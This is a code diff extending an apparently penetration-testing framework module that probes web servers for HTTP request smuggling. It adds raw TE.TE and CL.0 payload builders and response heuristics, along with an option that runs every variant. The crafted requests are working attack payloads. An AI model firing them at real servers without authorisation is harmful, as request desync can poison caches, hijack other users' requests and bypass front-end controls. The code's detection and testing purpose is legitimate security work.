@@ -59,7 +59,12 @@ class Module(Auxiliary):
     path = OptString("/", "Request path", True)
     ssl = OptBool(True, "Use SSL/TLS", True, advanced=True)
     timeout = OptInteger(10, "Socket timeout (seconds)", False, advanced=True)
-    variant = OptChoice("CL.TE", "Smuggling variant to test", True, ["CL.TE", "TE.CL"])
+    variant = OptChoice(
+        "CL.TE",
+        "Smuggling variant to test",
+        True,
+        ["CL.TE", "TE.CL", "TE.TE", "CL.0"],
+    )
 
     def check(self):
         try:
@@ -152,6 +157,66 @@ class Module(Auxiliary):
         )
         return req
 
+    def _build_te_te(self) -> bytes:
+        """TE.TE: dual Transfer-Encoding headers with obfuscation."""
+        path = (str(self.path).strip() or "/").encode("utf-8", errors="replace")
+        host = self._host_header()
+        body = b"0\r\n\r\nSMUGGLED"
+        req = (
+            b"POST " + path + b" HTTP/1.1\r\n"
+            b"Host: " + host + b"\r\n"
+            b"Transfer-Encoding: chunked\r\n"
+            b"Transfer-Encoding: x\r\n"
+            b"Content-Length: 4\r\n"
+            b"Connection: keep-alive\r\n"
+            b"\r\n"
+            + body
+        )
+        return req
+
+    def _build_cl0(self) -> bytes:
+        """CL.0: Content-Length zero with body smuggling."""
+        path = (str(self.path).strip() or "/").encode("utf-8", errors="replace")
+        host = self._host_header()
+        smuggled = b"GET /404 HTTP/1.1\r\nHost: " + host + b"\r\n\r\n"
+        req = (
+            b"POST " + path + b" HTTP/1.1\r\n"
+            b"Host: " + host + b"\r\n"
+            b"Content-Length: 0\r\n"
+            b"Connection: keep-alive\r\n"
+            b"\r\n"
+            + smuggled
+        )
+        return req
+
+    def _build_for_variant(self, variant: str) -> bytes:
+        v = variant.upper().replace('.', '.')
+        if v == 'CL.TE':
+            return self._build_cl_te()
+        if v == 'TE.CL':
+            return self._build_te_cl()
+        if v == 'TE.TE':
+            return self._build_te_te()
+        if v in ('CL.0', 'CL0'):
+            return self._build_cl0()
+        return self._build_cl_te()
+
+    def _analyze_response(self, resp: bytes, variant: str, elapsed: float) -> dict:
+        from core.output_handler import print_warning
+        first_line = resp.split(b"\r\n")[0] if b"\r\n" in resp else resp[:80]
+        status = first_line.decode("utf-8", errors="replace")
+        to_val = int(self.timeout) if self.timeout is not None else 10
+        result = {'variant': variant, 'status': status.strip(), 'elapsed': elapsed, 'likely': False}
+        if b"404" in resp and variant.upper() in ("TE.CL", "CL.0", "CL0"):
+            result['likely'] = True
+            result['reason'] = 'smuggled GET /404 reflected in response'
+        if elapsed > (float(to_val) * 0.8):
+            result['likely'] = True
+            result['reason'] = f'slow response ({elapsed:.2f}s) suggests desync'
+        if b"400 Bad Request" in resp and variant.upper() == "TE.TE":
+            result['reason'] = 'front-end rejected obfuscated TE (may still be vulnerable to other variants)'
+        return result
+
     def run(self):
         from core.output_handler import print_status, print_success, print_error, print_warning
 
@@ -170,30 +235,29 @@ class Module(Auxiliary):
             print_error("Target not reachable or not HTTP.")
             return
 
-        if variant.upper() == "CL.TE":
-            raw = self._build_cl_te()
-        else:
-            raw = self._build_te_cl()
+        variants = [variant]
+        if variant.upper() == "ALL":
+            variants = ["CL.TE", "TE.CL", "TE.TE", "CL.0"]
 
-        print_status("Sending crafted request...")
-        t0 = time.time()
-        resp = self._raw_request(raw)
-        elapsed = time.time() - t0
+        findings = []
+        for v in variants:
+            raw = self._build_for_variant(v)
+            print_status(f"Sending {v} crafted request...")
+            t0 = time.time()
+            resp = self._raw_request(raw)
+            elapsed = time.time() - t0
+            if not resp:
+                print_warning(f"{v}: no response received")
+                continue
+            analysis = self._analyze_response(resp, v, elapsed)
+            findings.append(analysis)
+            if analysis.get('likely'):
+                print_success(f"{v}: possible smuggling — {analysis.get('reason', 'indicator matched')}")
+            else:
+                print_status(f"{v}: {analysis.get('status', '?')} — no clear indicator")
 
-        if not resp:
-            print_error("No response received.")
-            return
-
-        # Heuristic: timeouts or connection closure can indicate back-end desync; 404 in response might indicate our smuggled GET /404 was executed
-        first_line = resp.split(b"\r\n")[0] if b"\r\n" in resp else resp[:80]
-        status = first_line.decode("utf-8", errors="replace")
-
-        if b"404" in resp and variant.upper() == "TE.CL":
-            print_success(f"Possible TE.CL smuggling: response suggests smuggled request was processed (404 seen). Check manually.")
-        to_val = int(self.timeout) if self.timeout is not None else 10
-        if elapsed > (float(to_val) * 0.8):
-            print_warning(f"Slow response ({elapsed:.2f}s) - possible desync. Verify with manual tests.")
-        else:
-            print_status(f"Response: {status.strip()}. No clear smuggling indicator; target may not be vulnerable or variant may differ. Try both CL.TE and TE.CL.")
-
-        print_status("Done. Use Burp Suite or manual requests for full confirmation.")
+        if any(f.get('likely') for f in findings):
+            print_success("At least one variant showed desync indicators — verify manually.")
+            return {'vulnerable': True, 'findings': findings}
+        print_status("Done. Try other variants or confirm with Burp Suite.")
+        return {'vulnerable': False, 'findings': findings}
